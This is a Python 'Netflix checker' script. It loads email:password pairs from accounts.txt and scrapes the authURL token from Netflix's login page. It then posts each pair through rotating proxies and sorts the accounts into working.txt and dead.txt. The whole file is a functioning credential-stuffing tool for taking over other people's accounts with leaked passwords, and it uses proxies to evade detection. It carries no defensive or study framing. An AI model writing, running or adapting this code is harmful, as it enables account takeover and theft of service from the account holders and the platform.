import os
import colored
import ctypes
import requests
from lxml import html,etree

clr = colored.fg('#f52900')

rr = colored.attr('reset')

class Netflix:
    def __init__(self):
        self.loginurl = "https://www.netflix.com/it/login"
    
    def getAuthUrl(self, proxy):
        headers = {
		   "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		   "Accept-Encoding":"gzip, deflate, sdch, br",
		   "Accept-Language":"it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
		   "Connection":"keep-alive",
		   "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
	    }
        r = requests.get(self.loginurl, headers=headers, proxies=proxy)
        tree = html.fromstring(r.text)
        return list(set(tree.xpath("//input[@name='authURL']/@value")))[0]
    
    def BuildPayload(self, auth, email, password):
        return {
            "email": email,
            "password": password,
            "rememberMe": 'true',
            'flow': 'websiteSignup',
		    'mode': 'login',
		    'action': 'loginAction',
		    'withFields': 'email,password,rememberMe,nextPage',
		    'authUrl': auth,
		    'nextPage': '',
        }

    def login(self, email, password, proxy):
        proxy = {
            "http": "http://"+proxy
        }
        token = self.getAuthUrl(proxy)
        payload = self.BuildPayload(token,email,password)
        headers = {
            'Accept-Encoding': 'gzip, deflate, br',
	        'Accept-Language': 'it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4',
	        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
	        'Content-Type': 'application/x-www-form-urlencoded',
	        'Accept': 'application/json, text/plain, */*',
	        'Connection': 'keep-alive',
        }
        r = requests.post(self.loginurl, headers=headers, data=payload, proxies=proxy)
        if r.url == self.loginurl:
            return [False, "Dead"]
        else:
            return [True, "Working"]



class Checker:
    def __init__(self, proxiespath: str=None):
        self.color = colored.fg('#f52900')
        self.reset = colored.attr('reset')
        self.path = proxiespath
        self.working = []
        self.failed = []
        
    def FetchEmail(self) -> list():
       email = list()
       with open(os.path.dirname(os.path.realpath(__file__))+'/accounts.txt', 'r') as r:
          for line in r.readlines():
             if ":" in line:
               email.append(line.split(":")[0])
       return email

    def FetchPasswords(self) -> list():
       passwords = list()
       with open(os.path.dirname(os.path.realpath(__file__))+'/accounts.txt', 'r') as r:
          for line in r.readlines():
              if ":" in line:
                 passwords.append(line.split(":")[1])
       return passwords

    def TotalAccounts(self) -> list():
       accounts = []
       with open(os.path.dirname(os.path.realpath(__file__))+'/accounts.txt', 'r') as r:
          for line in r.readlines():
             accounts.append(line)
       return accounts

    def GetProxies(self) -> list():
       proxies = []
       with open(self.path, 'r') as p:
          for line in p.readlines():
            proxies.append(str(line))
       return proxies

    def Exit(self):
        os._exit(0)
    
    def run(self):
        totalaccs = len(self.TotalAccounts())
        checked = 0
        num = 0
        ctypes.windll.kernel32.SetConsoleTitleW(f"[NETFLIX CHECKER] | {checked}/{totalaccs}")
        for p in self.GetProxies():
            netflix = Netflix()
            status = netflix.login(email=self.FetchEmail()[num], password=self.FetchPasswords()[num], proxy=p)
            checked += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f"[NETFLIX CHECKER] | {checked}/{totalaccs}")
            if status[0] == False:
                print(f"{self.FetchEmail()[num]}{self.color}:{self.reset}{self.FetchPasswords()[num]}          {self.color}|{self.reset} DEAD ACCOUNT")
                self.failed.append(self.FetchEmail()[num]+":"+self.FetchPasswords()[num])
            elif status[0] == True:
                print(f"{self.FetchEmail()[num]}{self.color}:{self.reset}{self.FetchPasswords()[num]}          {self.color}|{self.reset} WORKING ACCOUNT")
                self.working.append(self.FetchEmail()[num]+":"+self.FetchPasswords()[num])
            else:
                continue
            num+=1
        open(os.path.dirname(os.path.realpath(__file__))+'/working.txt', 'w').write('\n'.join(self.working))
        open(os.path.dirname(os.path.realpath(__file__))+'/dead.txt', 'w').write('\n'.join(self.failed))
        input(f"\nFinished checking {self.color}{checked}{self.reset} netflix accounts{self.color},{self.reset} press enter to exit{self.color}!{self.reset}")
        self.Exit()


if __name__ == '__main__':
    proxypath = input(f"Proxy path {clr}> {rr}")
    net = Checker(proxypath)
    net.run()
        
            



        




